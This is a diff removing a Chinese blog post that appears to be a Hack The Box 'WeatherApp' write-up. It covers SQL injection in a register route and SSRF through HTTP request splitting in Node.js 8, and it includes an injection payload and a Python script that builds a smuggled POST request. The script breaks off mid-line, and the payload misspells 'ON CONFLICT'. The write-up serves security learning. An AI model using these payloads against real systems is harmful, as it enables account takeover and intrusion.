@@ -151,217 +151,7 @@
   <div class="row">
 	
 	
-		<h1 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h1><p>项目结构</p>
-<img src="/2023/11/20/htb-WeatherApp/image-20231117194634866.png" class title="image-20231117194634866">
-
-<p>&#x2F;routes&#x2F;index.js里定义了路由接口，主要有三个：&#x2F;login，&#x2F;register，&#x2F;api&#x2F;weather。</p>
-<p><code>register</code>只对本地ip开放注册，引用了<code>db.register(username, password)</code>用于注册用户。关于db操作的方法均在<code>database.js</code>中定义</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// /routes/index.js</span>
-router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
-
-	<span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^.*:</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-
-	<span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
-
-	<span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">&amp;&amp;</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">return</span> db<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
-			<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">response</span><span class="token punctuation">(</span><span class="token string">'Successfully registered'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-			<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">response</span><span class="token punctuation">(</span><span class="token string">'Something went wrong'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-
-	<span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">response</span><span class="token punctuation">(</span><span class="token string">'Missing parameters'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">// db.register(username, password)定义</span>
-    <span class="token keyword">async</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token parameter">user<span class="token punctuation">,</span> pass</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token comment">// TODO: add parameterization and roll public</span>
-        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">INSERT INTO users (username, password) VALUES ('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>user<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">', '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>pass<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">')</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
-                <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token function">reject</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code>/login</code>引用了<code>db.isAdmin()</code>方法校验用户身份，如果是admin则显示flag</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// /routes/index.js login部分代码</span>
-router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
-	<span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
-
-	<span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">&amp;&amp;</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">return</span> db<span class="token punctuation">.</span><span class="token function">isAdmin</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
-			<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">admin</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
-				<span class="token keyword">if</span> <span class="token punctuation">(</span>admin<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/app/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-				<span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">response</span><span class="token punctuation">(</span><span class="token string">'You are not admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-			<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-			<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">response</span><span class="token punctuation">(</span><span class="token string">'Something went wrong'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	
-	<span class="token keyword">return</span> re<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">response</span><span class="token punctuation">(</span><span class="token string">'Missing parameters'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">// db.isAdmin(user, pass) 定义</span>
-
-    <span class="token keyword">async</span> <span class="token function">isAdmin</span><span class="token punctuation">(</span><span class="token parameter">user<span class="token punctuation">,</span> pass</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">let</span> smt <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>db<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">'SELECT username FROM users WHERE username = ? and password = ?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token keyword">let</span> row <span class="token operator">=</span> <span class="token keyword">await</span> smt<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> pass<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token function">resolve</span><span class="token punctuation">(</span>row <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">?</span> row<span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token function">reject</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>从上面两段代码可以看到，要获取flag，需要admin身份，在<code>isAdmin</code>中似乎找不到利用点，<code>register</code>中是存在sql注入漏洞的。而要使用<code>register</code>，就要找到<code>SSRF</code>。</p>
-<p>需要注意的是在<code>database.js</code>里</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token function">migrate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>db<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
-        DROP TABLE IF EXISTS users;
-
-        CREATE TABLE IF NOT EXISTS users (
-            id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
-            username   VARCHAR(255) NOT NULL UNIQUE,
-            password   VARCHAR(255) NOT NULL
-        );
-
-        INSERT INTO users (username, password) VALUES ('admin', '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">');
-    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>因此无法通过查询密码的方式登录admin，只能修改密码。</p>
-<p>再来看<code>/api/weather</code></p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// /routes/index.js /api/weather部分代码</span>
-router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/api/weather'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
-	<span class="token keyword">let</span> <span class="token punctuation">&#123;</span> endpoint<span class="token punctuation">,</span> city<span class="token punctuation">,</span> country <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
-
-	<span class="token keyword">if</span> <span class="token punctuation">(</span>endpoint <span class="token operator">&amp;&amp;</span> city <span class="token operator">&amp;&amp;</span> country<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">return</span> WeatherHelper<span class="token punctuation">.</span><span class="token function">getWeather</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> endpoint<span class="token punctuation">,</span> city<span class="token punctuation">,</span> country<span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-
-	<span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">response</span><span class="token punctuation">(</span><span class="token string">'Missing parameters'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
-
-<span class="token comment">// 对应WeatherHelper.getWeather()方法</span>
-    <span class="token keyword">async</span> <span class="token function">getWeather</span><span class="token punctuation">(</span><span class="token parameter">res<span class="token punctuation">,</span> endpoint<span class="token punctuation">,</span> city<span class="token punctuation">,</span> country</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-
-        <span class="token comment">// *.openweathermap.org is out of scope</span>
-        <span class="token keyword">let</span> apiKey <span class="token operator">=</span> <span class="token string">'10a62430af617a949055a46fa6dec32f'</span><span class="token punctuation">;</span>
-        <span class="token keyword">let</span> weatherData <span class="token operator">=</span> <span class="token keyword">await</span> HttpHelper<span class="token punctuation">.</span><span class="token function">HttpGet</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>endpoint<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/data/2.5/weather?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>city<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>country<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;units=metric&amp;appid=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>apiKey<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-        
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>weatherData<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">let</span> weatherDescription <span class="token operator">=</span> weatherData<span class="token punctuation">.</span>weather<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>description<span class="token punctuation">;</span>
-            <span class="token keyword">let</span> weatherIcon <span class="token operator">=</span> weatherData<span class="token punctuation">.</span>weather<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>icon<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">let</span> weatherTemp <span class="token operator">=</span> weatherData<span class="token punctuation">.</span>main<span class="token punctuation">.</span>temp<span class="token punctuation">;</span>
-
-            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>weatherIcon<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
-                    weatherIcon <span class="token operator">=</span> <span class="token string">'icon-clouds'</span><span class="token punctuation">;</span>
-                    <span class="token keyword">break</span><span class="token punctuation">;</span>
-                <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token number">10</span><span class="token operator">:</span>
-                    weatherIcon <span class="token operator">=</span> <span class="token string">'icon-rain'</span><span class="token punctuation">;</span>
-                    <span class="token keyword">break</span><span class="token punctuation">;</span>
-                <span class="token keyword">case</span> <span class="token number">11</span><span class="token operator">:</span>
-                    weatherIcon <span class="token operator">=</span> <span class="token string">'icon-storm'</span><span class="token punctuation">;</span>
-                    <span class="token keyword">break</span><span class="token punctuation">;</span>
-                <span class="token keyword">case</span> <span class="token number">13</span><span class="token operator">:</span>
-                    weatherIcon <span class="token operator">=</span> <span class="token string">'icon-snow'</span><span class="token punctuation">;</span>
-                    <span class="token keyword">break</span><span class="token punctuation">;</span>
-                <span class="token keyword">default</span><span class="token operator">:</span>
-                    weatherIcon <span class="token operator">=</span> <span class="token string">'icon-sun'</span><span class="token punctuation">;</span>
-                    <span class="token keyword">break</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-
-            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
-                <span class="token literal-property property">desc</span><span class="token operator">:</span> weatherDescription<span class="token punctuation">,</span>
-                <span class="token literal-property property">icon</span><span class="token operator">:</span> weatherIcon<span class="token punctuation">,</span>
-                <span class="token literal-property property">temp</span><span class="token operator">:</span> weatherTemp<span class="token punctuation">,</span>
-            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> 
-
-        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
-            <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Could not find </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>city<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> or </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>country<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
-        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>可以看到，<code>endpoint</code>，<code>city</code>，<code>country</code>都是可控的，可以在这里尝试SSRF</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> weatherData <span class="token operator">=</span> <span class="token keyword">await</span> HttpHelper<span class="token punctuation">.</span><span class="token function">HttpGet</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>endpoint<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/data/2.5/weather?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>city<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>country<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;units=metric&amp;appid=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>apiKey<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h1 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h1><p>在register处的sql注入。</p>
-<p>修改密码的语句可以构造为<code>&#39;) onconflict (username) do update set password = &#39;new_password&#39;; --</code></p>
-<p>对于SSRF，程序提供的方法是get，而注册的方法需要post，这里还需要用到请求走私的知识，node8的http模块很容易通过<em>request splitting（smugging）</em>受到ssrf攻击</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/f_cccc/article/details/116406838">https://blog.csdn.net/f_cccc/article/details/116406838</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting</a></p>
-<p>这里是它的翻译<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/2894</a></p>
-<p>这是一个<code>Node.js</code>的特性，用户发出的http请求路径指定为字符串，但是<code>Node.js</code>最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将字符串转换为字节意味着选择并应用适当的unicode编码。在处理不包含body的请求时，Node.js默认使用<code>latin1</code>，一种单字节编码处理字符（当处理高字节字符时，它将被阶段成其表示的最低字节）</p>
-<img src="/2023/11/20/htb-WeatherApp/image-20231119235544892.png" class title="image-20231119235544892">
-
-<p>当尝试在路径中使用http控制字符时，通常会被百分号转移</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span> http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://example.com/\r\n/test'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>output
-<span class="token punctuation">[</span> <span class="token string">'GET /%0D%0A/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n'</span> <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>然而，由于上述对unicode的处理漏洞可以用于帮助我们进行逃逸。</p>
-<p>当node.js8以及以下的版本使用<code>GET</code>请求一个URL时，不会造成逃逸因为这些不是http控制字符</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span> http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://example.com/\u010D\u010A/test'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>output
-<span class="token punctuation">[</span> <span class="token string">'GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n'</span> <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>而当这些字符串被指定为<code>latin1</code>时，这些字符被截断成<code>\r</code>和<code>\n</code>的字节形式。</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test'</span><span class="token punctuation">,</span> <span class="token string">'latin1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token string">'http://example.com/\r\n/test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>在<code>Node.js 10</code>之后，这个问题已经被修复，但是<code>Node.js 8</code>和更低版本的服务，如果用到了这个模块，并出现下列情况很可能受到SSRF：</p>
-<ul>
-<li>从用户输入接受unicode输入</li>
-<li>将这个输入包含到一个外发的http请求路径中</li>
-<li>请求的body为空（GET或DELETE）</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">空格 编码为 		  		\u0120 
-\r  编码为	 	 		 \u010D
-\n	编码为				 \u010A
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>目标构造的效果是</p>
-<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>
-<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
-
-<span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/register</span> <span class="token http-version property">HTTP/1.1</span></span>
-<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
-<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
-<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">xx</span></span>
-
-username=admin&amp;password=&#123;sqli-payload&#125;
-
-<span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
-
-url <span class="token operator">=</span> <span class="token string">"http://192.168.44.128:1337/api/weather"</span>
-<span class="token comment"># sql payload</span>
-username <span class="token operator">=</span> <span class="token string">'admin'</span>
-password <span class="token operator">=</span> <span class="token string">"1') ONCONFLICT (username) DO UPDATE SET password = 'admin';-- "</span>
-
-username <span class="token operator">=</span> username<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\u0120"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"%27"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">"%22"</span><span class="token punctuation">)</span>
-password <span class="token operator">=</span> password<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\u0120"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"%27"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">"%22"</span><span class="token punctuation">)</span>
-
-endpoint <span class="token operator">=</span> <span class="token string">"127.0.0.1/"</span> <span class="token operator">+</span> <span class="token string">"\u0120"</span> <span class="token operator">+</span> <span class="token string">"HTTP/1.1"</span> <span class="token operator">+</span> <span class="token string">"\u010D\u010A"</span>  <span class="token operator">+</span>  <span class="token string">"Host:"</span> <span class="token operator">+</span> <span class="token string">"\u0120"</span>\
-    <span class="token operator">+</span> <span class="token string">"127.0.0.1"</span> <span class="token operator">+</span> <span class="token string">"\u010D\u010A"</span> <span class="token operator">+</span> <span class="token string">"\u010D\u010A"</span> <span class="token operator">+</span> <span class="token string">"POST"</span> <span class="token operator">+</span> <span class="token string">"\u0120"</span> <span class="token operator">+</span> <span class="token string">"/register"</span> <span class="token operator">+</span>\
-    <span class="token string">"\u0120"</span> <span class="token operator">+</span> <span class="token string">"HTTP/1.1"</span> <span class="token operator">+</span> <span class="token string">"\u010D\u010A"</span> <span class="token operator">+</span> <span class="token string">"Host:"</span> <span class="token operator">+</span> <span class="token string">"\u0120"</span> <span class="token operator">+</span> <span class="token string">"127.0.0.1"</span> <span class="token operator">+</span> <span class="token string">"\u010D\u010A"</span>\
-    <span class="token operator">+</span> <span class="token string">"Content-Type:"</span> <span class="token operator">+</span> <span class="token string">"\u0120"</span> <span class="token operator">+</span> <span class="token string">"application/x-www-form-urlencoded"</span> <span class="token operator">+</span> <span class="token string">"\u010D\u010A"</span> <span class="token operator">+</span> \
